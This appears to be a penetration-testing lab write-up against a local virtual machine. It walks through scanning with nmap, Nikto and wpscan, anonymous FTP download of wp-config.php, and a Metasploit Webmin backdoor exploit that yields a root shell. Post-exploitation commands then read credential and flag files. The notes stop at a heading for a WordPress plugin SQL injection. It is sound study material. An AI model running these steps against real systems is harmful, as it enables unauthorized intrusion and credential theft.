PHASE 1: VULNERABILITY ASSESSMENT USING NESSUS

Step 0: Discovering the target IP address (**Netdiscover**)
kali$ netdiscover
kali$ nmap -sV -O 10.0.2.5

Step 1: Launching vulnerability assessment (**Nessus**) -> Automated VA
kali$ sudo systemctl start nessusd
https://localhost:8834

(to be updated)

Step A: Port scanning & Service fingerprinting (**Nmap**) -> Manual PT
kali$ nmap -sS -sV -O 10.0.2.5 
->vsFTPd 3.0.3 may have anonymous access enabled
->openSSH 7.4p1 Debian could be brute forced or banner exploited
->apache HTTPd is outdated, possible apache CVEs
->Miniserv webmin interface known for past RCEs
->OS detected as well

Step B: Web server analysis (**Nikto**) -> Manual PT
kali$ nikto -h http://10.0.2.5
->apache outdated = high risk
->wordpress indicators found (content disclosure, cms) = medium risk 
->security headers missing (x-frame options not set, clickjacking; x-content-type-options missing, mime sniffing attack) = medium risk
=>The server is hosting a potentially vulnerable CMS (Drupal/WordPress), is missing several basic HTTP security headers, and runs outdated software versions - all of which contribute to a weak attack surface. Additionally, the presence of Webmin interface (MiniServ) suggestsa potential vector for remote code execution (RCE).
=>exploit ftp, webmin, cms brute force, cms enum

PHASE 2: PENETRATION TESTING (MANUAL EXPLOITATION)

Exploit 1: FTP MISCONFIGURATION - ANONYMOUS ACCESS AND FILE DOWNLOAD

Step 1: Connect to FTP as an anonymous user
kali$ ftp 10.0.2.5
->unauthenticated access

Step 2: List FTP directory contents
ftp> ls
->wordpress installation 
->reveals key config and php files

Step 3: Download sensitive files
ftp> get wp-config.php
ftp> get wp-login.php
->config & login files downloaded

Step 4: Attempt to upload or create files (write test)
ftp> mkdir test => 550 permission denied
ftp> put shell.php => no such file
->write access restricted
->directory creation or file upload not possible

=>wp-config.php may expose db credentials, salts, default settings
=>read-access risky

Exploit 2: WEBMIN ACCESS - TARGETING REMOTE CODE EXECUTION

Step 1: Access Webmin in browser
https://10.0.2.5:10000
->version detected from nmap (MiniServ 1.890)

Step 2: Vulnerability check
->CVE-2019-15107 affects Webmin 1.890 — allows unauthenticated RCE via crafted POST request to /password_change.cgi.

Step 3: Exploit Webmin (**Metasploit**)
kali$ msfconsole -q
msf > search webmin
msf > use exploit/linux/webmin_backdoor
msf exploit(linux/webmin_backdoor) > set LHOST 10.0.2.15
msf exploit(linux/webmin_backdoor) > set RHOSTS 10.0.2.5
msf exploit(linux/webmin_backdoor) > set SSL true
msf exploit(linux/webmin_backdoor) > run
Command shell session 1 opened
whoami -> root (current user)
id -> uid=0(root) gid=0(root) groups=0(root) (confirm root privileges)
hostname -> HF2019-Linux (machine name)
uname -a -> (linux kernel version & architecture)


PHASE 2: NETWORK AND SERVICES ENUMERATION
//continue from step 3 from phase 1 exploit 2
ip a -> (internal ip, subnet & interfaces)
netstat -tulnp -> (open ports & associated services)


PHASE 3: OS & USER-SPECIFIC DETAILS
//continue from phase 2
cat /etc/os-release -> (OS info)
cat etc/issue -> (pre login text displayed on terminal screen)
sudo -l -> (commands which can be run as root)
ps aux -> (running processes)


PHASE 4: FILE & SERVICE DISCOVERY
//continue from phase 3
ls -la /home -> (reveals local users on system)
ls -la /root -> (flag.txt)
cat /root/flag.txt -> (confirms root-level access since only root has permission to read)
ls -la /var/www/html -> (lists web server directory, confirms wordpress installation & config files)


PHASE 5: EXTRACTING WORDPRESS CONFIGURATION (DB CREDENTIALS)
//continue from phase 4
cat /var/www/html/wp-config.php 
-> wp-config.php stores MySQL credentials & sensitive Wordpress settings
-> DB name, username & password found


Exploit 3: WORDPRESS ENUMERATION VIA WPSCAN
kali$ wpscan --url http://10.0.2.5
-> wordpress version 5.2.3 (insecure, outdated)
-> theme twentyseventeen (outdated)
-> wp-google-maps plugin found 
-> wp-cron.php endpoint found
-> readme.html found (reveals version)
-> phpinfo.php (info disclosure)
-> /uploads/ directory indexing enabled


Exploit 4: WORDPRESS PLUGIN SQL INJECTION - WP-GOOGLE-MAPS (CVE-2019-10692)

